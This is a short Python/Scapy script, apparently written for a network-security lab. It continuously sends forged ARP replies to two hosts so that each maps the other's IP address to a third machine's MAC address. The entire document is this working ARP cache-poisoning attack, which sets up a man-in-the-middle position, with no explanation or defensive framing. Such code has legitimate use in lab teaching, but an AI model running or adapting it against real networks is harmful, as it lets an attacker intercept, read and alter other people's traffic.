from time import sleep
from scapy.all import *

hostA_MAC = "02:42:0a:09:00:05"
hostB_MAC = "02:42:0a:09:00:06"
hostB_IP = "10.9.0.6"
hostA_IP = "10.9.0.5"
hostM_MAC = "02:42:0a:09:00:69"

# hostA
ePktA = Ether(src=hostM_MAC, dst=hostA_MAC)
aPktA = ARP(hwsrc=hostM_MAC, psrc=hostB_IP, pdst=hostA_IP, hwdst=hostA_MAC)
aPktA.op = 2 # 1 for ARP Request; 2 for ARP Reply

hostA_pkt = ePktA/aPktA

# hostB

ePkt_B = Ether(src=hostM_MAC, dst=hostB_MAC)
aPkt_B = ARP(hwsrc=hostM_MAC, psrc=hostA_IP, pdst=hostB_IP, hwdst=hostB_MAC)
aPkt_B.op = 2 # 1 for ARP Request; 2 for ARP Reply

hostB_pkt = ePkt_B/aPkt_B

while(True):
    sendp(hostA_pkt)
    sendp(hostB_pkt)
    sleep(3)
